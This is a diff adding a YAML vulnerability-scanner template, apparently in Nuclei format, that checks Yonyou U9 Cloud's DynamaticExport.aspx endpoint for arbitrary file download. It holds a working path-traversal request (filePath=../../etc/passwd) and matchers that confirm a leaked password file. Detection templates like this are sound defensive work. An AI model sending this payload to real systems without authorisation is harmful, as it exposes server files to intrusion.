@@ -1,0 +1,28 @@
+id: yonyou-dynamaticexport-arbitrary-file-download
+
+info:
+  name: Yonyou U9 Cloud DynamaticExport Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for an arbitrary file download vulnerability in Yonyou U9 Cloud's `DynamaticExport.aspx` endpoint. The issue allows attackers to download sensitive files from the server by manipulating the `filePath` parameter.
+  tags: yonyou,u9cloud,arbitrary-file-download
+
+http:
+  - raw:
+      - |
+        GET /Portal/Print/DynamaticExport.aspx?filePath=../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"  # Presence of /etc/passwd data
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/plain" # Ensures the response is in plain text format.
